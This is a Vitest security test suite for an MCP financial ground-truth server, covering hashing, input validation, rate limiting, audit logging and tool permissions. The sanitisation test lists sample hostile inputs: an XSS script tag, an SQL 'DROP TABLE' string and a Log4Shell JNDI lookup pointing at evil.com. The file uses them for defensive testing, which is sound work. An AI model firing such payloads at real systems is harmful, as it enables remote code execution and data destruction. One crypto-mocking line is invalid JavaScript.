import { vi } from "vitest";
/**
 * MCP Server Security Tests
 *
 * Comprehensive security tests for the MCP Financial Ground Truth Server
 * including hash validation, input sanitization, and permission boundary testing.
 */

import { MCPFinancialGroundTruthServer } from "../MCPServer";
import { logger } from "../../../lib/logger";

// Mock dependencies
vi.mock("../../../lib/logger");
vi.mock("../UnifiedTruthLayer");
vi.mock("../modules/EDGARModule");
vi.mock("../modules/XBRLModule");
vi.mock("../modules/MarketDataModule");
vi.mock("../modules/PrivateCompanyModule");
vi.mock("../modules/IndustryBenchmarkModule");
vi.mock("../modules/StructuralTruthModule");

describe("MCPFinancialGroundTruthServer - Security", () => {
  let server: MCPFinancialGroundTruthServer;
  const mockConfig = {
    edgar: {
      userAgent: "test-agent",
      rateLimit: 10,
    },
    xbrl: {
      userAgent: "test-agent",
      rateLimit: 10,
    },
    marketData: {
      provider: "alphavantage" as const,
      apiKey: "test-key",
      rateLimit: 5,
    },
    privateCompany: {
      enableWebScraping: false,
    },
    industryBenchmark: {
      enableStaticData: true,
    },
    truthLayer: {
      enableFallback: true,
      strictMode: true,
      maxResolutionTime: 30000,
      parallelQuery: false,
    },
    security: {
      enableWhitelist: true,
      enableRateLimiting: true,
      enableAuditLogging: true,
    },
  };

  beforeEach(async () => {
    server = new MCPFinancialGroundTruthServer(mockConfig);
    await server.initialize();
  });

  afterEach(async () => {
    if (server) {
      // Cleanup if needed
    }
  });

  describe("Hash Security", () => {
    it("should generate proper SHA-256 hashes", async () => {
      const testData = [
        { metric: "revenue", value: 1000000, source: "SEC" },
        { metric: "net_income", value: 100000, source: "SEC" },
      ];

      // Access the private method through reflection for testing
      const hashMethod = (server as any).generateVerificationHash.bind(server);
      const hash = await hashMethod(testData);

      expect(hash).toMatch(/^sha256:[a-f0-9]{64}$/);
      expect(hash).not.toContain("fallback:");
    });

    it("should use fallback hash only when crypto fails", async () => {
      // Mock crypto failure
      const originalCrypto = require("crypto");
      require("crypto") = undefined;

      const testData = [{ metric: "revenue", value: 1000000 }];
      const hashMethod = (server as any).generateVerificationHash.bind(server);
      const hash = await hashMethod(testData);

      expect(hash).toMatch(/^fallback:[a-f0-9]+$/);

      // Restore crypto
      require("crypto") = originalCrypto;
    });

    it("should generate different hashes for different data", async () => {
      const data1 = [{ metric: "revenue", value: 1000000 }];
      const data2 = [{ metric: "revenue", value: 2000000 }];

      const hashMethod = (server as any).generateVerificationHash.bind(server);
      const hash1 = await hashMethod(data1);
      const hash2 = await hashMethod(data2);

      expect(hash1).not.toBe(hash2);
    });

    it("should generate same hash for identical data", async () => {
      const data = [{ metric: "revenue", value: 1000000 }];

      const hashMethod = (server as any).generateVerificationHash.bind(server);
      const hash1 = await hashMethod(data);
      const hash2 = await hashMethod(data);

      expect(hash1).toBe(hash2);
    });
  });

  describe("Input Validation", () => {
    it("should reject invalid entity_id formats", async () => {
      const invalidIds = ["", "invalid-chars", "12345678901", "UPPERCASE"];

      for (const entityId of invalidIds) {
        const result = await server.executeTool("get_authoritative_financials", {
          entity_id: entityId,
          metrics: ["revenue"],
        });

        expect(result.isError).toBe(true);
        expect(result.content[0].text).toContain("error");
      }
    });

    it("should reject invalid metrics", async () => {
      const invalidMetrics = ["invalid_metric", "", "REVENUE", "Revenue"];

      for (const metric of invalidMetrics) {
        const result = await server.executeTool("get_authoritative_financials", {
          entity_id: "AAPL",
          metrics: [metric],
        });

        expect(result.isError).toBe(true);
      }
    });

    it("should reject invalid periods", async () => {
      const invalidPeriods = ["2024", "Q1-2024", "FY2024", "invalid"];

      for (const period of invalidPeriods) {
        const result = await server.executeTool("get_authoritative_financials", {
          entity_id: "AAPL",
          metrics: ["revenue"],
          period,
        });

        expect(result.isError).toBe(true);
      }
    });

    it("should reject invalid currency codes", async () => {
      const invalidCurrencies = ["usd", "GBP", "invalid", "123"];

      for (const currency of invalidCurrencies) {
        const result = await server.executeTool("get_authoritative_financials", {
          entity_id: "AAPL",
          metrics: ["revenue"],
          currency,
        });

        expect(result.isError).toBe(true);
      }
    });

    it("should sanitize claim text in verification", async () => {
      const maliciousClaims = [
        '<script>alert("xss")</script>',
        "DROP TABLE users;",
        "${jndi:ldap://evil.com/a}",
        "\x00\x01\x02",
      ];

      for (const claimText of maliciousClaims) {
        const result = await server.executeTool("verify_claim_aletheia", {
          claim_text: claimText,
          context_entity: "AAPL",
        });

        // Should not error out, but should sanitize the input
        expect(result.isError).toBe(false);
      }
    });
  });

  describe("Rate Limiting", () => {
    it("should enforce rate limits for tool execution", async () => {
      // Mock rate limiting in config
      const rateLimitedConfig = {
        ...mockConfig,
        security: {
          ...mockConfig.security,
          enableRateLimiting: true,
        },
      };

      const rateLimitedServer = new MCPFinancialGroundTruthServer(rateLimitedConfig);
      await rateLimitedServer.initialize();

      // Execute multiple requests rapidly
      const promises = Array.from({ length: 20 }, () =>
        rateLimitedServer.executeTool("get_authoritative_financials", {
          entity_id: "AAPL",
          metrics: ["revenue"],
        })
      );

      const results = await Promise.allSettled(promises);

      // Some requests should be rate limited
      const rejectedCount = results.filter(
        (r) => r.status === "rejected" || (r.status === "fulfilled" && r.value.isError)
      ).length;

      expect(rejectedCount).toBeGreaterThan(0);
    });
  });

  describe("Audit Trail Security", () => {
    it("should include audit trail in tool results", async () => {
      const result = await server.executeTool("get_authoritative_financials", {
        entity_id: "AAPL",
        metrics: ["revenue"],
      });

      expect(result.isError).toBe(false);

      const responseText = result.content[0].text;
      const response = JSON.parse(responseText);

      expect(response.audit).toBeDefined();
      expect(response.audit.trace_id).toMatch(/^mcp-req-\d+$/);
      expect(response.audit.timestamp).toBeDefined();
      expect(response.audit.verification_hash).toMatch(/^sha256:[a-f0-9]{64}$/);
    });

    it("should log errors in audit trail", async () => {
      const result = await server.executeTool("get_authoritative_financials", {
        entity_id: "INVALID",
        metrics: ["revenue"],
      });

      expect(result.isError).toBe(true);

      // Error should be properly logged (mock logger should be called)
      expect(logger.error).toHaveBeenCalled();
    });
  });

  describe("Data Leakage Prevention", () => {
    it("should not expose internal error details", async () => {
      const result = await server.executeTool("get_authoritative_financials", {
        entity_id: "NONEXISTENT",
        metrics: ["revenue"],
      });

      expect(result.isError).toBe(true);

      const errorText = result.content[0].text;
      const errorData = JSON.parse(errorText);

      // Should not expose stack traces or internal paths
      expect(errorData.error.message).not.toContain(".ts");
      expect(errorData.error.message).not.toContain("/src/");
      expect(errorData.error.message).not.toContain("stack");
    });

    it("should sanitize sensitive data from responses", async () => {
      // Test with mock data that might contain sensitive information
      const result = await server.executeTool("get_authoritative_financials", {
        entity_id: "AAPL",
        metrics: ["revenue"],
      });

      expect(result.isError).toBe(false);

      const responseText = result.content[0].text;
      const response = JSON.parse(responseText);

      // Should not contain API keys or internal tokens
      const responseString = JSON.stringify(response);
      expect(responseString).not.toContain("api_key");
      expect(responseString).not.toContain("token");
      expect(responseString).not.toContain("password");
    });
  });

  describe("Permission Boundaries", () => {
    it("should only allow defined tools", async () => {
      const invalidTools = ["hack_database", "get_secrets", "delete_all_data", "admin_access"];

      for (const toolName of invalidTools) {
        const result = await server.executeTool(toolName, {});
        expect(result.isError).toBe(true);
        expect(result.content[0].text).toContain("Unknown tool");
      }
    });

    it("should validate tool parameter boundaries", async () => {
      // Test with excessive parameter values
      const excessiveParams = {
        entity_id: "A".repeat(1000), // Very long entity ID
        metrics: Array.from({ length: 100 }, (_, i) => `metric_${i}`), // Too many metrics
        period: "FY".repeat(100), // Very long period
      };

      const result = await server.executeTool("get_authoritative_financials", excessiveParams);
      expect(result.isError).toBe(true);
    });
  });

  describe("Memory Safety", () => {
    it("should handle large requests without memory leaks", async () => {
      // Test with reasonably large but not excessive data
      const largeMetrics = Array.from({ length: 50 }, (_, i) => `metric_${i}`);

      const result = await server.executeTool("get_authoritative_financials", {
        entity_id: "AAPL",
        metrics: largeMetrics,
      });

      // Should handle gracefully
      expect(result.isError).toBe(false);
    });

    it("should cleanup resources properly", async () => {
      // Execute multiple tools and check for cleanup
      const promises = Array.from({ length: 10 }, (_, i) =>
        server.executeTool("get_authoritative_financials", {
          entity_id: `TEST${i}`,
          metrics: ["revenue"],
        })
      );

      await Promise.allSettled(promises);

      // Server should still be functional
      const result = await server.executeTool("get_authoritative_financials", {
        entity_id: "AAPL",
        metrics: ["revenue"],
      });

      expect(result.isError).toBe(false);
    });
  });
});
